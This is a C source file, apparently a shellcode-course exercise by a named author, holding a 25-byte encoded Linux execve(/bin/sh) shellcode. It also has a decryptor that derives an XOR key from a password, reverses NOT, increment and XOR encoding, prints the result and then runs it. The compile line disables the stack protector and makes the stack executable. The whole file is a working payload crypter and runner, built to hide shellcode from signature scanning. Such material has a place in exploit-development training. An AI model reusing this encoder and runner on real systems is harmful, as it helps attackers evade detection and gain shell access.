/*
Tested on       : Linux/x86
Author          : Elham AlShehri
ID              : SLAE-1538
Shellcode Size  : 25 bytes ( Null-free )
Description     : execve(/bin/sh)

Test Using:
        gcc -fno-stack-protector -z execstack decryptor.c -o decryptor -std=c99
        Usage: ./decryptor password
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\xe0\x2f\xbf\x87\xc2\xc2\x9e\x87\x87\xc2\x8d\x88\x81\x68\x0e\xbf\x68\x0d\xbe\x68\x10\x5f\xe6\x24\x6f";

void print(char *res, int len)
{
    for (int c = 0; c < len; c++)
        printf("\\x%02x", res[c] & 0xffU);
    printf("\n");
}
int generateXOR(unsigned char *key)
{
    int l1 = strlen(key);
    int xor = 0;
    for (int i = 0; i < l1; i++)
        xor ^= key[i];
    return xor;
}
int decrypt(int xorKey)
{
    int l2 = strlen(shellcode);
    int i;
    unsigned char decipher[l2];

    // 1. not
    for (i = 0; i < l2; i++)
        shellcode[i] = ~shellcode[i];

    // --------------------------------------------------------
    // 2. inc
    for (i = 0; i < l2; i++)
        shellcode[i] = shellcode[i] + '\x01';

    // 3. xor
    // check the result of xor is not 0
    for (i = 0; i < l2; i++)
        shellcode[i] = (shellcode[i] ^ xorKey) ? shellcode[i] ^ xorKey : shellcode[i];

    printf("[+] Decrypted shellcode ( %d bytes ): \n", l2);
    print(shellcode, l2);

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        printf("\tUsage: %s password\n", argv[0]);
        return 1;
    }
    char *key = argv[1];
    int xorKey = generateXOR(key);

    printf("[+] XOR key = \\x%02x\n", xorKey);
    decrypt(xorKey);

    printf("Running it now...\n\n\n\n");
    int (*ret)() = (int (*)())shellcode;
    ret();
    return 0;
}